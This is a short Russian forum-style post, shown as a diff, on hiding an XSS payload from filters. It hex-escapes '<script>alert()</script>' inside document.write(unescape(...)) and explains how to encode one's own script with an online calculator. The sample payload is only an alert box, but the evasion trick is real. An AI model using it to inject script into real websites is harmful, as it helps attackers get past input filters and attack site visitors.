@@ -1,0 +1,30 @@
+до:
+
+PHP:
+<script>alert()</script>
+после:
+
+PHP:
+<script language="JavaScript">
+document.write(unescape("\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e"))
+</script>
+если влом качать nettools, то есть ещё один выход...
+идёшь сюда -> http://ha.ckers.org/xss.html
+прокручиваешь в самый низ, в заголовок Character Encoding Calculator
+
+в поле ASCII Text пихаешь свой код, например:
+PHP:
+<script>alert()</script>
+жмёшь Encode
+
+в поле Hex Value, получаешь:
+
+PHP:
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%29%3C%2F%73%63%72%69%70%74%3E
+теперь меняешь "%" на "\x", и вставляешь
+
+PHP:
+<script language="JavaScript">
+document.write(unescape("сюда"))
+</script>
+и не забудь про ± ))) 
